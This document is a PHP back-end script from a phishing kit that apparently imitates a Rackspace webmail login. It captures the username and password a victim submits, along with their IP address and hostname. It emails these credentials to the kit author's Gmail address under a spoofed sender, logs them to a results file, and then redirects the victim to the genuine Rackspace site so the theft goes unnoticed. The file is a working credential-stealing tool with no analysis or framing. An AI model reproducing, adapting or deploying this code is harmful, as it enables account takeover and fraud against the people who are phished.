<?php   ob_start();  ?>
<?
include "Roz$$$.php";
?>
<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------- Up.net Details  ---------------\n";
$message .= "|Email Address  : ".$_POST['username']."\n";
$message .= "|Email Password : ".$_POST['password']."\n";
$message .= "--------xX CREATED BY Ro+zay Xx--------\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | MR.Ro+zay: ".date("g:i:s:a || D-d-M-Y")."\n";
$message .= "--------------------------------------------------\n";

$send="poshrozay87@gmail.com";
$subject = "SMTP | ".$_POST['username']." | $ip";
$headers = "From: Ro+zay<noreply@spammersupport.info>";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("../rezult.txt","a");
fputs($fp,$message);
fclose($fp);
@header("Location: https://apps.rackspace.com");

	 
?>